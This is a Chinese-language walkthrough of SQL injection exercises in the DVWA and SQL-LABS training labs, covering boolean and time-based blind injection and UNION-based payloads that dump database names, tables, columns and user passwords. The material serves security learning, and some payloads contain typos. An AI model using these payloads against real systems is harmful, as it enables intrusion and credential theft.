#### SQL-Injection(Blind)

> SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

```
盲注中常用的几个函数：
substr(a,b,c)：从b位置开始，截取字符串a的c长度 
count()：计算总数 
ascii()：返回字符的ascii码 
length()：返回字符串的长度 left(a,b)：从左往右截取字符串a的前b个字符 
sleep(n):将程序挂起n秒
```
**手工盲注思路**

手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里只演示基于布尔的盲注与基于时间的盲注。
```
下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：

1.判断是否存在注入，注入是字符型还是数字型 
2.猜解当前数据库名 
3.猜解数据库中的表名
4.猜解表中的字段名 
5.猜解数据
```
#####  Low

![image-20200403135051500](https://i.loli.net/2020/04/03/RhjDfIrv4G53gpK.png)

**分析：**
Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种：
`
User ID exists in the database.‘与‘ User ID is MISSING from the database.
`
因此这里是SQL盲注漏洞。

**漏洞利用**

`基于布尔的盲注：`

**1.判断是否存在注入，注入是字符型还是数字型**

当输入的参数为字符串时，称为字符型。`字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。`

输入1，显示相应用户存在：

![image-20200403134048181](https://i.loli.net/2020/04/03/2epAMrkh7WZtIbR.png)


输入1’ and 1=1 #，显示存在：

![image-20200403134048181](https://i.loli.net/2020/04/03/2epAMrkh7WZtIbR.png)

输入1’ and 1=2 #，显示不存在：

![image-20200403134132131.png](https://i.loli.net/2020/04/03/sH8qpIPw39nTMkS.png)


**2.猜解当前数据库名**

想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。
```sql
输入1’ and length(database())=1 #，显示不存在；
输入1’ and length(database())=2 #，显示不存在；
输入1’ and length(database())=3 #，显示不存在；
输入1’ and length(database())=4 #，显示存在：
```
说明数据库名长度为4。

下面采用二分法猜解数据库名。
```sql
输入1' and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
输入1' and ascii(substr(databse(),1,1))<122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
输入1' and ascii(substr(databse(),1,1))<109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
输入1' and ascii(substr(databse(),1,1))<103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
输入1' and ascii(substr(databse(),1,1))<100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
输入1' and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。
…
```
重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。

**3.猜解数据库中的表名**

首先猜解数据库中表的数量：
```sql
1' and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在
1' and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在
```
说明数据库中共有两个表。

接着挨个猜解表名：
```sql
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在 
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在
 … 
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
```
说明第一个表名长度为9。
```sql
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 # 显示不存在
1' and ascii(substr((select table_name from information_schema.tables where table_schema=data'ase() limit 0,1),1,1))>103 # 显示不存在
```
说明第一个表的名字的第一个字符为小写字母g。


重复上述步骤，即可猜解出两个表名（guestbook、users）。

**4.猜解表中的字段名**

首先猜解表中字段的数量：
```sql
1' and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在 
...
1' and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在
```
说明users表有8个字段。

接着挨个猜解字段名：
```sql
1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在
…
1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在
```
说明users表的第一个字段为7个字符长度。

采用二分法，即可猜解出所有字段名。

**5.猜解数据**

同样采用二分法。

`基于时间的盲注：`

**1.判断是否存在注入，注入是字符型还是数字型**
```sql
输入1' and sleep(5) #，感觉到明显延迟；
输入1 and sleep(5) #，没有延迟；
```
说明存在字符型的基于时间的盲注。

**2.猜解当前数据库名**

首先猜解数据名的长度：
```sql
1' and if(length(database())=1,sleep(5),1) # 没有延迟 1' and if(length(database())=2,sleep(5),1) # 没有延迟 1' and if(length(database())=3,sleep(5),1) # 没有延迟 1' and if(length(database())=4,sleep(5),1) # 明显延迟
```
说明数据库名长度为4个字符。

接着采用二分法猜解数据库名：
```sql
1' and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 明显延迟 … 1' and if(ascii(substr(database(),1,1))<100,sleep(5),1)# 没有延迟 1' and if(ascii(substr(database(),1,1))>100,sleep(5),1)# 没有延迟 说明数据库名的第一个字符为小写字母d。
 …
```
重复上述步骤，即可猜解出数据库名。

**3.猜解数据库中的表名**

首先猜解数据库中表的数量：
```sql
1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟
1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
```
说明数据库中有两个表。

接着挨个猜解表名：
```sql
1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟
…
1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
```
说明第一个表名的长度为9个字符。

采用二分法即可猜解出表名。

**4.猜解表中的字段名**

首先猜解表中字段的数量：
```sql
1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟
…
1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
```
说明users表中有8个字段。

接着挨个猜解字段名：
```sql
1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟
…
1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
```
说明users表的第一个字段长度为7个字符。

采用二分法即可猜解出各个字段名。

**5.猜解数据**

同样采用二分法。

#####  Medium

![image-20200403134213853](https://i.loli.net/2020/04/03/xqvpgwTZ9PWU2rA.png)


**分析：**
Medium级别的代码利用mysql_real_escape_string函数对特殊符号

\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

**漏洞利用**

虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。

上文有详细的盲注流程，这里就简要演示几个。

首先是`基于布尔的盲注：`
```sql
抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；
抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；
抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。
```
然后是`基于时间的盲注：`
```sql
抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；
抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；
抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。
```
##### High

![image-20200403134236798.png](https://i.loli.net/2020/04/03/T9rGwI3HZWvDyJi.png)

**分析：**
High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

**漏洞利用**

虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：
```sql
抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；
抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；
抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。
```

### SQL-LABS

#### Less-1(GET单引号字符型注入)

```mysql
#查看页面变化，判断sql注入类别
?id=1 and 1=1
?id=1 and 1=2

#确定字段数 #不能用#【坑点1】
?id=1' order by 3 --+
?id=1' order by 4 %23

#联合查询查看显示位 #id要为负数【坑点2】
?id=-1' union select 1,2,3 --+

#爆库【security】
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
?id=-1' union select 1,2,database() --+   

#爆表【emails,referers,uagents,users】
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

#爆列【...id,username,password...】
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+

#爆值【DumbDumb...】
?id=-1' union select 1,2,group_concat(username,password) from users --+
```

**坑点1：**URL框中的sql语句中不能用直接使用`#`号，要用`--+`(等价于--空格)或者`%23`，但是输入框中可以用`#`，应为输入框提交是会执行一次URL编码，`#`会被编译成`%23`
原因是url中`#`号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括`#`
将#号改成url的编码`%23`或者使用`--+`就可以了

**坑点2：**在联合查询查看显示位，使用union联合查询后发现页面返回的数据没变，这是因为如果左边的SQL语句正确执行那么就会只返回左边第一个查询语句的运行结果，那么我们只要让第一行查询的结果是空集（即union左边的select子句查询结果为空），那么我们union右边的查询结果自然就成为了第一行，就打印在网页上了。

这个id传递的是数字，而且一般都是从1开始自增的，我们可以把id值设为非正数（负数或0），浮点数，字符型或字符串都行，主要是使左边的查询语句报错就行。

#### Less-2(GET数字型注入)

```mysql
#查看页面变化，判断sql注入类别
?id=1 and 1=1
?id=1 and 1=2
#确定字段数
?id=1 order by 3
?id=1 order by 4 
#联合查询查看显示位
?id=-1 union select 1,2,3
#爆库
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata
?id=-1 union select 1,2,database()
#爆表
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
#爆列
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
#爆值
?id=-1 union select 1,2,group_concat(username,password) from users
```

#### Less-3(GET单引号变形字符型注入)

```mysql
#查看页面变化，判断sql注入类别
?id=1 and 1=1
?id=1 and 1=2
?id=1' order by 3 --+
#报错 for the right syntax to use near 'order by 3 -- ') LIMIT 0,1' at line 1
#由错误提示可知后台查询语句应为select * from * where id = ('$id') LIMIT 0,1
#构造?id=1') --+ 进行测试。访问正常，猜测正确。
#确定字段数
?id=1') order by 3 --+
?id=1') order by 4 --+
#联合查询查看显示位
?id=-1') union select 1,2,3 --+
#爆库
?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata --+
?id=-1') union select 1,2,database() --+
#爆表
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
#爆列
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
#爆值
?id=-1') union select 1,group_concat(username),group_concat(password) from users --+
```

#### Less-4(GET双引号字符型注入)

```mysql
#查看页面变化，判断sql注入类别
?id=1 and 1=1
?id=1 and 1=2
?id=1' order by 4 --+
?id=1" order by 4 --+
#报错  to use near 'order by 4 -- ") LIMIT 0,1' at line 1
#由错误提示可知后台查询语句应为select * from * where id = ("$id") LIMIT 0,1
#构造?id=1") --+ 进行测试。访问正常，猜测正确。
#确定字段数
?id=1") order by 3 --+
?id=1") order by 4 --+
#联合查询查看显示位
?id=-1") union select 1,2,3 --+
#爆库
?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata --+
?id=-1") union select 1,2,database() --+
#爆表
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
#爆列
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
#爆值
?id=-1") union select 1,group_concat(username),group_concat(password) from users --+
```



#### Less-5(双注入GET单引号字符型注入)





# 一些感悟

我自己我在学习Web安全的过程中，也是倍感枯燥，总想急于求成，想要简单学一哈就能实现各种🐄🍺操作，显然不是那么容易的，所以请静下心来钻研吧，慢慢来，比较快！

